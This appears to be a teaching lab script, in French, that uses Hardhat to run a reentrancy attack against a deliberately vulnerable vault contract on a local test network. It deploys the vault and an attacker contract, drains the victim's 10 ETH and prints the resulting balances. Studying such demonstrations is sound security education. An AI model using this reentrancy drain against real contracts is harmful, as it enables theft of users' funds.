const { ethers } = require("hardhat");

function eth(valeur) {
  return `${ethers.formatEther(valeur)} ETH`;
}

function raison(erreur) {
  return erreur.shortMessage || erreur.reason || erreur.message;
}

async function main() {
  const [alice, modou] = await ethers.getSigners();

  console.log("==================================================");
  console.log(" ETAPE 1 - Attaque du coffre vulnerable");
  console.log("==================================================");

  const VulnerableVault = await ethers.getContractFactory("VulnerableVault");
  const coffre = await VulnerableVault.deploy();
  await coffre.waitForDeployment();
  const coffreAdresse = await coffre.getAddress();
  console.log("Coffre vulnerable deploye :", coffreAdresse);

  await coffre.connect(alice).deposer({ value: ethers.parseEther("10") });
  console.log("Alice depose 10 ETH");

  const Attacker = await ethers.getContractFactory("Attacker");
  const attaquant = await Attacker.connect(modou).deploy(coffreAdresse);
  await attaquant.waitForDeployment();
  const attaquantAdresse = await attaquant.getAddress();
  console.log("Contrat attaquant deploye :", attaquantAdresse);

  await attaquant.connect(modou).attaquer({ value: ethers.parseEther("1") });
  console.log("Modou depose 1 ETH via le contrat attaquant");
  console.log("La fonction receive() rappelle retirer() a chaque envoi");

  console.log("");
  console.log("Reentrances executees      :", (await attaquant.reentrances()).toString());
  console.log("Solde du coffre            :", eth(await ethers.provider.getBalance(coffreAdresse)));
  console.log("Solde du contrat attaquant :", eth(await ethers.provider.getBalance(attaquantAdresse)));
  console.log("Solde enregistre d'Alice   :", eth(await coffre.balances(alice.address)));

  try {
    await coffre.connect(alice).retirer();
    console.log("Alice a retire ses 10 ETH");
  } catch (erreur) {
    console.log("Alice tente de retirer     : REVERT ->", raison(erreur));
  }

  await attaquant.connect(modou).retirerFonds();
  console.log("Transfert des 11 ETH vers Modou");
  console.log("Solde restant du contrat   :", eth(await ethers.provider.getBalance(attaquantAdresse)));
}

main().catch((erreur) => {
  console.error(erreur);
  process.exitCode = 1;
});
